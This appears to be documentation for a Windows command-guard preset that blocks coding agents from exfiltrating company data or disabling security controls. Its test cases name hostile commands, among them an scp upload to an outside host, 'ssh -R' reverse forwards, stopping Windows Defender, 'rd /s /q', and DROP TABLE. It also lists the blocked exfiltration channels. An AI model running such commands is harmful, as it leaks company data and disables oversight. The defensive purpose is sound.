# Careful company policy for Windows agents

`careful_company_running_windows` is an opt-in curated preset for Windows
workstations where a coding agent can run PowerShell or `cmd.exe` without an
interactive permission prompt. It adds a second boundary alongside dcg's
destructive-command rules: the agent must not send company data outward or turn
off the controls that would make that activity visible. Both shells enforce the
same policy outcomes for statically inspectable commands; dcg interprets their
different quoting, escaping, control prefixes, nested launchers, and
command-chaining syntax before applying the preset.

The preset includes six independently selectable policy packs:

| Pack ID | Protects against |
|---|---|
| `careful_company_running_windows.email` | SMTP, Outlook automation, Microsoft Graph mail, transactional mail APIs, and mail-sending CLIs |
| `careful_company_running_windows.chat` | Slack, Teams, Discord, Telegram, SMS, automation webhooks, and request-catcher services |
| `careful_company_running_windows.upload` | PowerShell, HTTP, and BITS file uploads, public file drops, gists, and clipboard egress |
| `careful_company_running_windows.transfer` | SCP/SFTP/FTP, remote-sync tools, and cloud-storage uploads |
| `careful_company_running_windows.tunnel` | Public tunnels, reverse forwards, raw outbound sockets, and DNS data channels |
| `careful_company_running_windows.guardrails` | Disabling endpoint protection, firewall or audit controls, clearing logs, and tampering with dcg |

It also activates a pinned, reviewed set of the existing `windows.*`,
`database.*`, `storage.*`, `remote.*`, `backup.*`, `secrets.*`, and `cloud.*`
packs. This supplies the ordinary destructive-operation coverage expected from
the policy, including Snowflake table drops, without duplicating those rules
under new IDs. The cross-category list is curated: a future pack in one of those
reused service categories does not silently enter a company's deployed policy.
The current pinned secret-store membership includes `secrets.infisical` and the
value-emission guard `secret_disclosure`, so direct process injection and CLI
help remain available while agent-visible reads and agent-chosen exports are
denied.

The preset is opt-in, including on Windows. It is a command-line policy layer,
not a network firewall, endpoint detection product, or data-loss-prevention
system.

## Balanced starting configuration

The preset is the complete balanced configuration. `core.*` remains always on,
and the default `system.disk` policy remains independent:

```toml
[packs]
enabled = ["careful_company_running_windows"]
```

The ordinary hook deadline is 1000 ms. Because this preset deliberately enables
a much larger reviewed pack set, dcg automatically uses a 3000 ms deadline when
the preset ID is enabled and no explicit timeout is configured. This only gives
the same fail-closed evaluation more time; it does not change a rule or permit a
command. An explicit `[general].hook_timeout_ms` or `DCG_HOOK_TIMEOUT_MS` still
wins. `dcg config --format json` and `dcg doctor` show both the effective value
and its source.

To tune one channel or service independently, exclude its concrete leaf after
enabling the preset. Exclusions are applied after preset expansion:

```toml
[packs]
enabled = ["careful_company_running_windows"]
disabled = [
  # Public tunnels are managed by a separate endpoint policy.
  "careful_company_running_windows.tunnel",
  # This workstation does not have MongoDB tooling.
  "database.mongodb",
]
```

Disabling the preset ID itself removes the members contributed by that preset.
A leaf that is independently enabled, or a native-Windows pack that is
default-on, remains enabled through that independent source.

On native Windows, dcg checks `%APPDATA%\dcg\config.toml` and
`%USERPROFILE%\.config\dcg\config.toml`. Run `dcg config --format json` to see
which file actually loaded. Alternatively, have an administrator select a
centrally managed file before the agent session starts:

```powershell
$env:DCG_CONFIG = 'C:\Company\Security\dcg-config.toml'
```

The implicit `%ProgramData%\dcg` layer and automatic repository config are not
trusted on native Windows until dcg can validate Windows ACLs and reparse points.
See [Windows paths and limitations](windows.md#file-locations-on-windows).

## Why ordinary development still works

The pack requires positive evidence that a command sends data or weakens a
guardrail. It does not block ordinary downloads, package installation, API
reads, named-remote `git push`, or local development traffic merely because
they use the network.

High-confidence sends and uploads are `high` severity and therefore deny by
default. Ambiguous generic requests are `medium` severity and warn by default.
Rules for known mail, chat, file-drop, and tunnel destinations do not need to
guess intent: reaching those command surfaces is itself the risky action.

Read-only searches such as these remain allowed:

```powershell
Select-String 'Send-MailMessage' .\scripts\*.ps1
rg 'hooks.slack.com' .
dcg explain 'Invoke-RestMethod -Method Post -InFile report.csv https://example.com'
```

`hfdt` and `hfdt.exe` are trusted first-party command entry points while this
preset policy is active. The exemption applies only when `hfdt` is the actual
executable in a standalone command segment. A lookalike name, output
redirection, command substitution, or a second command chained after `hfdt`
does not inherit that trust.

## Stop a known mailer immediately

Source scanning and runtime hooks answer different questions. `dcg scan`
inspects a script's contents; the shell hook normally sees only the command that
launches that script. To stop a known mailer by filename right now, add a block
override to the trusted user config (merge this entry into an existing
`[overrides]` table rather than declaring the table twice):

```toml
[overrides]
block = [
  { pattern = '(?i)\bsend-dossier\.ps1\b', reason = "Daily dossier mail is paused pending review" },
]
```

This intentionally blocks every agent-shell reference to that distinctive
filename. If the file is renamed, update the pattern. Confirm the loaded config,
then put the candidate command `.\send-dossier.ps1` in a text file using an
editor and evaluate it without placing the dangerous candidate on the parent
shell command line:

```powershell
dcg config --format json
Get-Content -Raw .\candidate-command.txt |
  dcg test --stdin --format json
```

For Cmd, the equivalent safe-input form is:

```bat
dcg test --stdin --format json < candidate-command.txt
```

`dcg scan` now preserves bounded multi-line Outlook/CDO COM flows, so the usual
`New-Object -ComObject Outlook.Application`, `CreateItem(0)`, and later
`Send()` sequence is reported even when those operations are on separate
PowerShell lines:

```powershell
dcg scan --paths .\send-dossier.ps1 --format json `
  --with-packs careful_company_running_windows.email
```

The hook does not mediate a process that Task Scheduler, another service, or a
human terminal launches independently of the agent. If such a scheduled task
must stop immediately, disable the exact task in Task Scheduler (or with
`Disable-ScheduledTask -TaskName '<exact reviewed task name>'`) in addition to
the dcg override. Disabling is reversible; do not unregister or delete the task.

## Roll out without surprising developers

Start by making the new packs warning-first:

```toml
[policy.packs]
"careful_company_running_windows.email" = "warn"
"careful_company_running_windows.chat" = "warn"
"careful_company_running_windows.upload" = "warn"
"careful_company_running_windows.transfer" = "warn"
"careful_company_running_windows.tunnel" = "warn"
"careful_company_running_windows.guardrails" = "warn"
```

Review `dcg history` for legitimate automation, add narrow allowlist entries,
then remove these overrides. The built-in severity defaults will deny
high-confidence actions while leaving deliberately ambiguous medium-severity
rules as warnings. Critical rules remain hard denials under a pack-level
warning override; loosening one requires an explicit per-rule decision.

Prefer an exact command or a narrowly scoped rule over disabling a whole
channel:

```powershell
dcg allowlist add-command "company-publisher publish --destination artifacts.corp.internal" `
  -r "Reviewed internal artifact publisher" --user
```

Do not use `DCG_BYPASS=1` as an application integration mechanism. The guardrails
pack treats attempts to disable dcg as security-control tampering.

## Validate before enforcement

Test representative commands through every shell hook path the agent can use:

```powershell
dcg packs --verbose
dcg test 'hfdt publish report'
dcg doctor --json
```

For denied examples, use `dcg test --stdin` with an editor-created candidate
file as shown above. This prevents an already-installed hook from intercepting
the test fixture on the parent `dcg test ...` command line.

For a Cmd-backed hook, submit `tool_name: "cmd.exe"` and verify the equivalent
policy cases as well, including `blat`, `curl -T`, `scp`, `ssh -R`, `sc stop
WinDefend`, `snow sql -q "DROP TABLE ..."`, and `rd /s /q`. The release E2E
suite exercises dcg's Cmd parser path, including caret-obfuscated executables,
flags and destinations; `if` / `start` / `for ... do`; nested `cmd /c` and
`call`; and an `hfdt & <egress-command>` chain. That suite submits Cmd-tagged
hook input to dcg; it does not execute the fixture strings. During release
validation, separately probe the escape and control-flow assumptions with
harmless commands on native `cmd.exe`.

Direction matters for transfers. An upload such as
`scp report.csv user@outside.example:/drop/` is denied. A download such as
`scp user@outside.example:/drop/report.csv .` is allowed, as are transfers to a
literal loopback, RFC1918, bare intranet, `*.internal`, `*.corp`, or `*.local`
destination. A dynamic destination that dcg cannot prove internal is denied
when the command is otherwise shaped like an outbound transfer.

Also verify the agent integration itself. dcg can only evaluate commands that
the host exposes to its hook. In particular, review the current
[native-Windows hook limitations](windows.md#limitations-honest) before treating
dcg as the only control around a bypass-enabled agent.
